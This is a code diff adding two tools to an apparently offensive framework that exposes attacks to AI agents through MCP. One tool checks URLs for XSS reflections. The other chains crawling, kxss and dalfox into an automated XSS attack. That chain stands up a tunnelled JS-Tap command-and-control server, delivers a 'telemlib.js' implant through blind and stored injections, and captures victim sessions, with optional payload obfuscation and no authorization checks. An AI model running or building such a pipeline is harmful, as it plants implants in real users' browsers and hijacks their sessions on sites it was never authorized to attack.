@@ -6508,6 +6508,170 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
 
         return result
 
+    # =========================================================================
+    # KXSS + DALFOX XSS PIPELINE TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def kxss_check(
+        urls: str,
+        target: str = "",
+    ) -> Dict[str, Any]:
+        """
+        Run kxss to quickly check URLs for XSS reflection points.
+
+        kxss tests each URL for reflections of dangerous characters
+        (< > " ' ` etc.) and reports candidates. Much faster than dalfox
+        for large URL lists — use it as a pre-filter before dalfox.
+
+        Args:
+            urls:   Newline or comma-separated list of URLs to check
+            target: Single target URL (alternative to urls list)
+
+        Returns:
+            candidates list, count, and raw kxss stdout
+        """
+        url_list = []
+        if target:
+            url_list = [target]
+        elif urls:
+            url_list = [u.strip() for u in urls.replace(",", "\n").splitlines() if u.strip()]
+
+        data: Dict[str, Any] = {"urls": url_list}
+
+        logger.info(
+            f"{HexStrikeColors.NEON_BLUE}🔍 kxss: checking {len(url_list)} URL(s) "
+            f"for reflections{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/kxss", data)
+
+        count = result.get("candidates_count", 0)
+        color = HexStrikeColors.SUCCESS if count else HexStrikeColors.WARNING
+        logger.info(
+            f"{color}{'✅' if count else '⚠️ '} kxss: {count} reflection candidate(s) "
+            f"from {result.get('urls_checked', 0)} URLs{HexStrikeColors.RESET}"
+        )
+        return result
+
+    @mcp.tool()
+    def dalfox_xss_chain(
+        target: str,
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_username: str = "",
+        jstap_password: str = "",
+        beacon_interval: int = 10,
+        use_crawler: bool = True,
+        use_wayback: bool = True,
+        crawl_depth: int = 3,
+        kxss_filter: bool = True,
+        dalfox_workers: int = 5,
+        obfuscate: bool = False,
+        obfuscation_technique: str = "base64_eval",
+        dry_run: bool = False,
+        max_dalfox_urls: int = 20,
+    ) -> Dict[str, Any]:
+        """
+        Best-in-class XSS pipeline: katana → kxss → dalfox → JS-Tap → beacon.
+
+        This replaces nuclei_to_xss_chain with purpose-built XSS tooling:
+
+          Stage 1  katana + waybackurls  — JS-aware crawl + historical URLs
+          Stage 2  kxss                  — fast reflection pre-filter
+          Stage 3  JS-Tap C2 + tunnel   — get telemlib.js public URL
+          Stage 4  dalfox --blind        — context-aware XSS scan; the
+                                           --blind URL IS our telemlib.js,
+                                           so dalfox delivers the implant
+                                           for reflected AND blind/stored XSS
+          Stage 5  beacon listener      — capture incoming sessions
+
+        The dalfox --blind integration is the key insight: instead of
+        pointing blind XSS callbacks at a generic canary, we point them
+        at telemlib.js. Every successful blind/stored injection loads
+        our JS-Tap implant automatically — no separate delivery step needed.
+
+        Use dry_run=True first to preview what URLs would be fed to dalfox.
+
+        Args:
+            target:               Target URL (e.g. https://target.com)
+            tunnel_provider:      'auto', 'ngrok', 'cloudflared', 'serveo'
+            tunnel_auth_token:    ngrok auth token (optional)
+            jstap_port:           Local JS-Tap port (default 8444)
+            jstap_username:       JS-Tap portal username (for beacon)
+            jstap_password:       JS-Tap portal password (for beacon)
+            beacon_interval:      Beacon poll interval in seconds
+            use_crawler:          Run katana + waybackurls (default True)
+            use_wayback:          Include waybackurls in discovery (default True)
+            crawl_depth:          Katana crawl depth (default 3)
+            kxss_filter:          Pre-filter URLs with kxss (default True)
+            dalfox_workers:       Dalfox concurrency (default 5)
+            obfuscate:            Apply payload obfuscation (default False)
+            obfuscation_technique: Technique if obfuscate=True
+            dry_run:              Preview only, no C2/injection (default False)
+            max_dalfox_urls:      Cap URLs sent to dalfox (default 20)
+
+        Returns:
+            Per-stage results, findings list, public C2 URL, next_steps
+        """
+        data: Dict[str, Any] = {
+            "target": target,
+            "tunnel_provider": tunnel_provider,
+            "jstap_port": jstap_port,
+            "beacon_interval": beacon_interval,
+            "use_crawler": use_crawler,
+            "use_wayback": use_wayback,
+            "crawl_depth": crawl_depth,
+            "kxss_filter": kxss_filter,
+            "dalfox_workers": dalfox_workers,
+            "obfuscate": obfuscate,
+            "obfuscation_technique": obfuscation_technique,
+            "dry_run": dry_run,
+            "max_dalfox_urls": max_dalfox_urls,
+        }
+        if tunnel_auth_token:
+            data["tunnel_auth_token"] = tunnel_auth_token
+        if jstap_username:
+            data["jstap_username"] = jstap_username
+        if jstap_password:
+            data["jstap_password"] = jstap_password
+
+        prefix = "[DRY RUN] " if dry_run else ""
+        logger.info(
+            f"{HexStrikeColors.HACKER_RED}⛓️  {prefix}XSS pipeline: "
+            f"{target}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/pipeline/xss", data)
+
+        if dry_run:
+            queued = len(result.get("queued_for_dalfox", []))
+            logger.info(
+                f"{HexStrikeColors.WARNING}🔍 Dry run: "
+                f"{result.get('stages', {}).get('discovery', {}).get('urls_found', 0)} URLs found, "
+                f"{result.get('stages', {}).get('kxss', {}).get('candidates', queued)} kxss hits, "
+                f"{queued} queued for dalfox{HexStrikeColors.RESET}"
+            )
+        else:
+            findings = result.get("findings_count", 0)
+            pub_url = result.get("public_url", "")
+            color = HexStrikeColors.SUCCESS if findings else HexStrikeColors.WARNING
+            logger.info(
+                f"{color}{'✅' if findings else '⚠️ '} {findings} XSS finding(s) confirmed "
+                f"by dalfox | C2: {pub_url}{HexStrikeColors.RESET}"
+            )
+            if findings:
+                logger.info(
+                    f"{HexStrikeColors.HIGHLIGHT_RED} Implant delivered via dalfox blind XSS → "
+                    f"{result.get('telemlib_url', '')} {HexStrikeColors.RESET}"
+                )
+            # Log per-finding detail
+            for f in result.get("stages", {}).get("dalfox", {}).get("findings", []):
+                logger.info(
+                    f"  [{f.get('method')}] param:{f.get('param')} → {f.get('target_url')}"
+                )
+
+        return result
+
     return mcp
 
 def parse_args():
